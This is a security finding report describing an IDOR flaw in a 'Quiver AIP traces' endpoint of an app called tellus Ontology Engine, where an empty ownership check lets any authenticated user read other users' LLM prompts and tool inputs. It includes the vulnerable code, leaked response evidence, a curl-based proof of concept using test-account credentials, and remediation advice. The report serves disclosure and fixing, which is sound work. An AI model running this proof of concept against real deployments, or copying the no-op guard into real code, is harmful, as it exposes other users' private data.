# IDOR: Cross-user read of Quiver AIP traces exposes LLM prompts and tool inputs

**ID:** vuln-0028
**Severity:** MEDIUM
**Found:** 2026-08-18 06:45:44 UTC
**Target:** tellus Ontology Engine — http://host.docker.internal:3000
**Endpoint:** /quiver/api/v1/aip/traces/:rid
**Method:** GET
**CWE:** CWE-639
**CVSS:** 4.3
**Fix Effort:** Low

## Description

The `GET /quiver/api/v1/aip/traces/:rid` endpoint returns any user's AIP trace — including the plaintext `prompt` and `toolInvocations` — to any other authenticated user. The ownership check on `src/routes/quiver/aip.ts` contains an empty enforcement block, so it never actually rejects a mismatched caller.

## Evidence

Live trace created by the editor account (`userRid 633a9660-e374-41c6-87e0-d213cf50623d`), fetched with a *fresh* viewer token belonging to a different user — HTTP 200 with the plaintext prompt and tool inputs returned:

```json
{
  "rid": "ri.tellus-quiver.main.trace.01a01398-0d2b-743a-86b4-d7f6c1a5638c",
  "analysisRid": "ri.analysis.probe.1",
  "userRid": "633a9660-e374-41c6-87e0-d213cf50623d",
  "surface": "GENERATE",
  "prompt": "Reply with exactly: PONG",
  "toolInvocations": [
    { "tool": "object_query", "input": { "prompt": "Reply with exactly: PONG" }, "latencyMs": 0, "startedAt": "2026-08-18T06:38:47.084Z" }
  ],
  "totalTokens": 12,
  "createdAt": "2026-08-18 06:38:47.08489+00"
}
```

The vulnerable guard (empty enforcement block):

```typescript title=src/routes/quiver/aip.ts startLineNumber=224 endLineNumber=227

  if (trace.userRid !== actor.user.userRid && trace.userRid !== "*") {

  }
  res.status(200).json(trace);
```

## Impact

Any authenticated user (including the lowest-privilege "viewer" role and zero-role accounts) can read every other user's Quiver AIP traces. Traces contain the full plaintext LLM prompt — which in real usage embeds business data, object rids, and PII (e.g. "show quarterly revenue for confidential clients") — plus complete tool-invocation inputs. The trace rid is disclosed in the SSE `done` frame of every AIP call, so discovery of another user's rid is trivial for any co-tenant attacker. This is a horizontal, cross-user confidentiality breach of AI-assistant conversation content. Demonstrated impact is read of a single other user's trace (C:L); prompt content is stored plaintext so leakage is direct, not hashed.

## Technical Analysis

The trace-read route performs an authorization check that has no enforcement body. In `src/routes/quiver/aip.ts`, the `GET /aip/traces/:rid` handler fetches the trace and then evaluates ownership, but the "mismatch" branch is a comment-only no-op and execution falls through to `res.status(200).json(trace)` for any authenticated principal:

```typescript title=src/routes/quiver/aip.ts startLineNumber=224 endLineNumber=227
  // CBAC v1: trace visible to its author. Same-org reads allowed via D-59.
  if (trace.userRid !== actor.user.userRid && trace.userRid !== "*") {
    // Tightening to OMS-backed CBAC tracked under B1 C-21 (D-16 deferral).
  }
  res.status(200).json(trace);
```

Because there is no `return`, `throw`, or non-2xx response inside the `if` block, the guard is dead code. The object rid is supplied in the URL path (`req.params.rid`), making this a classic user-controlled-key (IDOR/BOLA) flaw. The trace persistence layer (`src/services/quiver/aip/traces.ts`) stores `prompt` as a plaintext column alongside `promptSha256`, so prompts are directly replayable by the reader rather than only hash-verifiable. Trace rids are high-entropy UUIDs but are emitted to the caller in the SSE `done` event of every `generate`/`configure`/`assist` stream, so an attacker who can observe any done frame (or any leaked log) obtains a directly fetchable rid.

## Proof of Concept

1. As user A (editor, `userRid 633a9660-e374-41c6-87e0-d213cf50623d`), mint a Keycloak JWT and call `POST /quiver/api/v1/aip/generate` with any prompt; read the trace rid from the SSE `done` event.
2. As user B (viewer, a different `userRid`), mint a separate Keycloak JWT.
3. Call `GET /quiver/api/v1/aip/traces/{userA_trace_rid}` with user B's token.
4. Observe HTTP 200 with a body containing user A's plaintext `prompt` and `toolInvocations`, confirming cross-user read.

```python
# 1. Editor (user A) generates a trace
KC=http://host.docker.internal:8086/realms/tellus/protocol/openid-connect/token
EDIT=$(curl -s -X POST "$KC" -H "Host: localhost:8086" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&client_id=tellus-frontend&username=cypress@tellus.local&password=Password123!&scope=openid" \
  | python3 -c "import json,sys;print(json.load(sys.stdin)['access_token'])")
curl -s -X POST http://host.docker.internal:3000/quiver/api/v1/aip/generate \
  -H "Authorization: Bearer $EDIT" -H "Content-Type: application/json" \
  -d '{"analysisRid":"ri.analysis.probe.1","prompt":"Reply with exactly: PONG"}'
#   -> SSE done frame contains the trace rid, e.g.
#      ri.tellus-quiver.main.trace.01a01398-0d2b-743a-86b4-d7f6c1a5638c

# 2. Viewer (user B) fetches user A's trace
VIEWER=$(curl -s -X POST "$KC" -H "Host: localhost:8086" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&client_id=tellus-frontend&username=cypress-viewer@tellus.local&password=Password123!&scope=openid" \
  | python3 -c "import json,sys;print(json.load(sys.stdin)['access_token'])")
curl -s -H "Authorization: Bearer $VIEWER" \
  http://host.docker.internal:3000/quiver/api/v1/aip/traces/ri.tellus-quiver.main.trace.01a01398-0d2b-743a-86b4-d7f6c1a5638c
#   -> HTTP 200, editor's prompt and toolInvocations returned to the viewer
```

## Remediation

Enforce the ownership check for real: when `trace.userRid` is neither the caller's `userRid` nor the `*` wildcard, return an error and stop. Follow the IDOR-as-404 pattern already used elsewhere in the jemma/quiver routes (return 404 so trace existence is not oracle-able by co-tenants), or return 403 if explicit denial is preferred. Implement the intended same-org exception referenced by `D-59` via the OMS-backed CBAC check rather than leaving it as a comment, and add an automated test asserting that `GET /aip/traces/:rid` returns a non-200 when the requester is not the trace author.

## Assumptions

Assumes the application is deployed with its current dev configuration (`NODE_ENV=development`), which is the target as-deployed; the fix is required regardless of environment because the guard is inert in all builds. The attacker is a legitimately authenticated low-privilege user (viewer) or zero-role authenticated account. Trace rids are obtainable by the attacker because they are revealed in the SSE `done` frame of their own AIP calls and follow a predictable concatenation of timestamp + random component, and by observing shared logs/events.
